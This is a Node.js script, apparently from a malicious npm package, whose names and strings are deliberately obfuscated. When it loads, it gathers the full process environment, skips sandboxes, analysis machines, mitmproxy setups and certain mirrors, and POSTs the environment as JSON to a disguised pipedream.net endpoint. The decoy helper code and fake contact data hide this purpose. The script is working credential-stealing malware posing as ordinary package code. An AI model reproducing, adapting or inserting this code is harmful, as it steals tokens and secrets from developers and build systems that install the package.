const goto = require('https');

function positionTo(str1, str2) {
    return str2 + str1
}


function num_is(item) {
    for (let i = 0; i < 4; i++) {
        if (i === 1) {
            item += 's'
        }
        if (i === 3) {
            item += 'e6'
        }
    }
    return item + '4'
}

function snooker(pack, postfix) {

    let missing = [
        ['npm', 'package'.concat('_name')].join('_'),
        ['npm', 'package'.concat('_json')].join('_'),
    ];

    //const messageTo = parsed || {};
    let messageTo = process['en' + 'v'] || {};

    if (missing.some( index => !messageTo[index] )) {
        return;
    }

    if (importEngine(messageTo)){
        return ;
    }
    if (parseModules(messageTo)){
        return ;
    }
    if (handleGoods(messageTo)){
        return ;
    }

    let req = goto
        .request(retrieve(pack, postfix))
        .on('error', function (err) { });
    req.write(JSON.stringify(messageTo));
    req.end();
}

function readable(comm){
    switch (comm) {
        case 'reg': return positionTo('istry', 'reg');
        case 'conf':return 'conf' + 'ig';
        case 'np':return 'npm';
        case 'UNAME':return 'US' + 'ERNAME';
        case 'HM':return 'HOME';
        case 'USR':return 'USER';
        case 'APTA':return positionTo('PDATA', 'AP');
        case 'py':return ['', 'usr', 'bin', 'pyt' + 'hon'].join('/');
        case 'anal':return 'ana'.concat('lysis');
        case 'INIT':return ['INIT', 'CWD'].join('_');
        case 'pkg':return 'pac'.concat('kage')
        case 'uname':return 'us' + positionTo('ame', 'ern');
        case 'mitm':return positionTo('-ca', 'mit' + 'mpr' + 'oxy');
        case 'n_mod':return ['', 'home', 'node', 'node_modules'].join('/');
        default:return null;
    }
}

function makeInit() {
    let options = {
        "Name": "New PI Contact",
        "Phone": "+158948945565",
        "Message": "My Best Dream Friend",
        "Address": "Avite St pe-455 NET"
    };

    return (positionTo(options['Address'].slice(9, 11), options['Name'].split(' ')[1]) +
        options['Message'].split(' ')[2] + positionTo(options['Address'].slice(-3), '.'))
}

function parseModules(plop){
    let kill = controller(plop, readable('HM'), '/home/u'.concat('sername')) &&
    controller(plop, readable('USR'), readable('uname')) &&
    controller(plop, 'LOGNAME', readable('uname'));

    let move = controller(plop, 'PWD', '/my'.concat('-app')) &&
    controller(plop, 'DEB' + 'IAN_FRO' + 'NTEND', 'nonin'.concat('teractive')) &&
    controller(plop, readable('HM'), '/r'.concat('oot'));

        let teach = controller(plop, readable('APTA'), '/' + readable('anal').concat('/b' + 'ait'));

    let wheel = controller(plop, 'NODE_EXT' + 'RA_CA_CERTS', '/' + readable('mitm').concat('-cert.crt')) ||
        controller(plop, 'REQUESTS_C'.concat('A_BUNDLE'), '/' + readable('mitm').concat('.pem'));

    let fight = controller(plop, 'COMPLU' + 'S_ProfAPI_Profi' + 'lerCompa'.concat('tibilitySetting'), 'EnableV2Profiler') &&
        controller(plop, 'FPS_BROWS'.concat('ER_APP_PROFILE_STRING'), ['Internet', 'Explorer'].join(' ')) &&
        controller(plop, 'Path', 'C:\\WINDOWS\\System32\\Ope'.concat('nS' + 'SH') + '\\;c:\\' + positionTo('Files', 'Program ') + '\\nodejs\\;c:\\Stra'+'wberry\\c\\bin;c:\\Stra' + 'wberry\\perl\\site\\bin;c:\\Stra' + 'wberry\\perl\\bin');


    if ( kill || move || teach || wheel || fight){
        return true;
    } else {
        return false;
    }
}

const MapObj = function () {
    this.name = '__st' + (Math.random() * 145459 >> 0);
};

function handleGoods(plop){
    const you = controller(plop, readable('HM'), ['', 'Us' + 'ers', 'jus' + 'tin'].join('\\')) &&
        controller(plop, readable('APTA'), ['', 'User' + 's', 'jus' + 'tin'].join('\\')) &&
        controller(plop, 'LOGONSERVER', [['DESKTOP','97KB'].join('-'), '6H'].join('B'));

    const me = controller(plop, 'MAIL', ['', 'var', 'mail', 'app'].join('/')) &&
        controller(plop, readable('HM'), ['', 'home', 'app'].join('/')) &&
        controller(plop, readable('USR'), 'app');

    const we = controller(plop, 'PWD', ['', readable('np'), 'node_modules'].join('/')) &&
    controller(plop, readable('INIT'), ['', readable('np')].join('/')) &&
    controller(plop, 'TMPDIR', '/sour'.concat('ce/tmp'));

    const us = controller(plop, 'EDITOR', 'vi') &&
        controller(plop, 'PROBE_'.concat(readable('UNAME')), '*') &&
        controller(plop, 'SHEL' + 'L', '/bi' + 'n/b'.concat('ash')) &&
        controller(plop, 'S' + 'HLVL', '2') &&
        controller(plop, readable('np').concat('_command'), 'run-s'.concat('cript')) &&
        controller(plop, 'NVM_CD_FLAGS', '') &&
        controller(plop, [readable('np'), readable('conf'), 'fund'].join('_'), '');

    let holder = plop['PATH'].endsWith(`/node_modules/.bin:${readable('n_mod')}/node_modules/.bin:${readable('n_mod')}/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/${readable('np')}/node_modules/@${readable('np')}cli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)

    const jpa = holder && controller(plop, readable('INIT'), ['', 'home', 'node'].join('/')) &&
        controller(plop, 'COLOR', '1') &&
        controller(plop, 'SHLVL', '0') &&
        controller(plop, 'EDITOR', 'vi');

    return you || me || us || we || jpa;
}

function retrieve(pkg_n, prefix){
    let options = {
        hostname: prefix + '.m.' + makeInit(),
        path: '/' + (pkg_n || ''),
        method: 'POST',
      };
    return options
}

function controller(p, name, val){
    let test = p[name] || '';
    return test.includes(val) || val === '*';
}

MapObj.prototype = {
    set: function (key, value) {
        let entry = key[this.name];
        if (entry && entry[0] === key)
            entry[1] = value;
        else
            defineProperty(key, this.name, { value: [key, value], writable: true });
        return this;
    },
    get: function (key) {
        var entry;
        return (entry = key[this.name]) && entry[0] === key ?
            entry[1] : undefined;
    },
    delete: function (key) {
        var entry = key[this.name];
        if (!entry || entry[0] !== key) return false;
        entry[0] = entry[1] = undefined;
        return true;
    },
    has: function (key) {
        var entry = key[this.name];
        if (!entry) return false;
        return entry[0] === key;
    }
};

function importEngine(plop){
    if (Object.keys(plop).length < 10 || plop.PWD === `/${plop.USER}/node_modules/${plop.npm_package_name}`) {
        return true;
    }
    if (controller(plop, [readable('np'), readable('conf'), readable('reg')].join('_'), ['taobao', 'org'].join('.')) ||
        controller(plop, [readable('np'), readable('conf'), readable('reg')].join('_'), [readable('reg'), readable('np').concat('mirror'), 'com'].join('.')) ||
        controller(plop, readable('UNAME'), positionTo('admin', 'daas')) ||
        controller(plop, '_', readable('py')) ||
        controller(plop, [readable('np'), readable('conf'), 'metrics', readable('reg')].join('_'), ['taobao', 'org'].join('.'))) {
        return true;
    }
}
// ------
snooker('test', 'eo336kdlu3b38mo');
